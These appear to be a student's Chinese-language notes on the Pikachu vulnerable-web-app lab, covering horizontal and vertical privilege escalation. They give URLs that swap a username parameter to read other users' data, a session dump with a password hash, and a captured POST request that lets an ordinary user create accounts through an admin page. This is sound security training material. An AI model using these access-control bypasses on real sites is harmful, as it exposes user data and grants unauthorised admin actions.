


## 水平越权

lucy/123456 (登入這個)
lili/123456,
kobe/123456



### 登入lucy 可以查看個資

username 可以修改為其他用戶偷看。


```
http://pika/vul/overpermission/op1/op1_mem.php?username=lucy&submit=%E7%82%B9%E5%87%BB%E6%9F%A5%E7%9C%8B%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF

http://pika/vul/overpermission/op1/op1_mem.php?username=lili&submit=%E7%82%B9%E5%87%BB%E6%9F%A5%E7%9C%8B%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF

http://pika/vul/overpermission/op1/op1_mem.php?username=kobe&submit=%E7%82%B9%E5%87%BB%E6%9F%A5%E7%9C%8B%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF
```










## 垂直越权

这里有两个用户
### 1. admin/123456 (超级boss)

admin 有多一個功能添加用戶
```
http://pika/vul/overpermission/op2/op2_admin_edit.php
```



### pikachu/000000 (一般)

啥功能都沒有只有查看。


直接輸入 http://pika/vul/overpermission/op2/op2_admin_edit.php 居然可以使用admin 的添加功能。



不過輸入資料後會跳轉最後跳轉回 http://pika/vul/overpermission/op2/op2_login.php  也就是登入畫面

但其實經過測試，他不會幫我們刪掉 session 所以還是登入狀態

你可以看一下session 儲存在哪，怎麼儲存
```
op2|a:3:{s:8:"username";s:7:"pikachu";s:8:"password";s:40:"1f604490cbdd4ec35cfa681bcf3df8fac26e0cb5";s:5:"level";i:2;}
```





### 問題在 op2_admin_edit.php 

* 他只判端登入狀態，沒有判斷是否為admin，所以只要登入狀態下都可以新增用戶   



* 送到repeater 方便添加

```http=
POST /vul/overpermission/op2/op2_admin_edit.php HTTP/1.1
Host: pika
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 114
Origin: http://pika
Connection: close
Referer: http://pika/vul/overpermission/op2/op2_admin_edit.php
Cookie: PHPSESSID=qcddjta90rsdkrmnp551frv2f1
Upgrade-Insecure-Requests: 1

username=1111&password=11111111&sex=111111&phonenum=111111&email=111111&address=11111111&submit=%E5%88%9B%E5%BB%BA
```




